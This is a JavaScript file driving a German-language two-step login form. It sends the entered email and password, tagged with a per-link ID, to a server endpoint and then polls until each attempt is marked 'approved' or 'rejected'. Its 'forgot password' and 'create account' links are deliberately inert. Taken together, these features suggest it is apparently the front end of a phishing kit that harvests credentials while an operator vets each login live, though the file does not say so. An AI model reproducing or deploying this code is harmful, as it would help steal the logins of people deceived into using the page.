(() => {
  const cfg = window.__CFG__ || {};
  if (cfg.not_found || cfg.view !== 'login') return;

  const $ = (id) => document.getElementById(id);
  const card = $('login-card');
  const form = $('login-form');
  const emailInput = $('email-input');
  const emailEdit = $('email-edit');
  const passwordWrap = $('password-wrap');
  const passwordInput = $('password-input');
  const passwordToggle = $('password-toggle');
  const loginError = $('login-error');
  const loginErrorText = $('login-error-text');
  const loginForgot = $('login-forgot');
  const loginBtn = $('login-btn');
  const loginBtnLabel = loginBtn.querySelector('.login-btn-label');
  const registerEl = $('login-register');

  let emailLocked = false;
  let pollTimer = null;

  if (card) {
    gsap.fromTo(card,
      { y: 16, opacity: 0 },
      { y: 0, opacity: 1, duration: 0.5, ease: 'power2.out' });
  }

  $('login-title').textContent = cfg.login_title || '';
  $('login-subtitle').textContent = cfg.login_subtitle || '';
  emailInput.placeholder = cfg.login_email_label || 'E-Mail*';
  passwordInput.placeholder = cfg.login_password_label || 'Passwort*';
  emailEdit.textContent = cfg.login_edit_link || 'Bearbeiten';
  loginForgot.textContent = cfg.login_forgot || 'Passwort vergessen?';
  setRegisterText(cfg.login_register || '');
  document.title = cfg.login_title || document.title;

  if (cfg.saved_email) {
    showPasswordStep(cfg.saved_email);
  } else {
    setEmailStep();
  }

  function setRegisterText(text) {
    registerEl.textContent = '';
    const marker = 'Erstelle ein Konto';
    const idx = text.indexOf(marker);
    if (idx === -1) {
      registerEl.textContent = text;
      return;
    }
    registerEl.appendChild(document.createTextNode(text.slice(0, idx)));
    const link = document.createElement('a');
    link.href = '#';
    link.textContent = marker;
    registerEl.appendChild(link);
    const tail = text.slice(idx + marker.length);
    if (tail) registerEl.appendChild(document.createTextNode(tail));
  }

  function setEmailStep() {
    loginBtnLabel.textContent = cfg.login_button_continue || 'Weiter';
    loginBtn.classList.remove('login-btn--submit');
  }

  function setPasswordStepUi() {
    loginBtnLabel.textContent = cfg.login_button || 'Einloggen';
    loginBtn.classList.add('login-btn--submit');
  }

  function hideError() {
    loginError.hidden = true;
    passwordInput.classList.remove('is-error');
  }

  function showError(msg) {
    loginErrorText.textContent = msg || cfg.login_error || '';
    loginError.hidden = false;
    passwordInput.classList.add('is-error');
    gsap.fromTo(loginError,
      { y: -6, opacity: 0 },
      { y: 0, opacity: 1, duration: 0.3, ease: 'power2.out' });
  }

  function shake() {
    gsap.fromTo(card,
      { x: -8 },
      { x: 0, duration: 0.45, ease: 'elastic.out(1.2, 0.35)', clearProps: 'x' });
  }

  function setLoading(on) {
    loginBtn.disabled = on;
    loginBtn.classList.toggle('is-loading', on);
    emailInput.readOnly = on || emailLocked;
    passwordInput.readOnly = on;
  }

  function showPasswordStep(email) {
    emailInput.value = email;
    emailLocked = true;
    emailInput.readOnly = true;
    emailInput.classList.add('is-locked');
    emailEdit.hidden = false;
    passwordWrap.hidden = false;
    setPasswordStepUi();
    passwordInput.focus();
  }

  function unlockEmail() {
    emailLocked = false;
    emailInput.readOnly = false;
    emailInput.classList.remove('is-locked');
    emailEdit.hidden = true;
    passwordWrap.hidden = true;
    passwordInput.value = '';
    hideError();
    setEmailStep();
    emailInput.focus();
  }

  emailEdit.addEventListener('click', unlockEmail);

  passwordToggle.addEventListener('click', () => {
    const isPassword = passwordInput.type === 'password';
    passwordInput.type = isPassword ? 'text' : 'password';
    passwordToggle.querySelector('.eye-open').hidden = !isPassword;
    passwordToggle.querySelector('.eye-closed').hidden = isPassword;
  });

  loginForgot.addEventListener('click', (e) => e.preventDefault());
  registerEl.addEventListener('click', (e) => {
    if (e.target.tagName === 'A') e.preventDefault();
  });

  passwordInput.addEventListener('input', hideError);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideError();

    if (!emailLocked) {
      const email = emailInput.value.trim();
      if (!email || !email.includes('@')) {
        emailInput.focus();
        shake();
        return;
      }
      showPasswordStep(email);
      return;
    }

    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!password) {
      passwordInput.focus();
      shake();
      return;
    }

    setLoading(true);
    try {
      const r = await fetch('/api/login.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ id: cfg.link_id, email, password }),
      });
      if (!r.ok) throw new Error('http ' + r.status);
      const data = await r.json();
      startPolling(data.attempt_id);
    } catch (_) {
      setLoading(false);
      showError('Verbindungsfehler. Erneut versuchen.');
      shake();
    }
  });

  function startPolling(attemptId) {
    stopPolling();
    const interval = Math.max(500, cfg.polling_interval_ms || 2000);
    const tick = async () => {
      try {
        const r = await fetch('/api/login-status.php?attempt_id=' + encodeURIComponent(attemptId), {
          cache: 'no-store',
          credentials: 'same-origin',
        });
        if (!r.ok) return;
        const data = await r.json();
        if (data.status === 'approved') {
          stopPolling();
          window.location.reload();
        } else if (data.status === 'rejected') {
          stopPolling();
          setLoading(false);
          showError(cfg.login_error);
          shake();
          passwordInput.value = '';
          passwordInput.focus();
        }
      } catch (_) {}
    };
    tick();
    pollTimer = setInterval(tick, interval);
  }

  function stopPolling() {
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }

  setTimeout(() => emailInput.focus(), 400);
})();
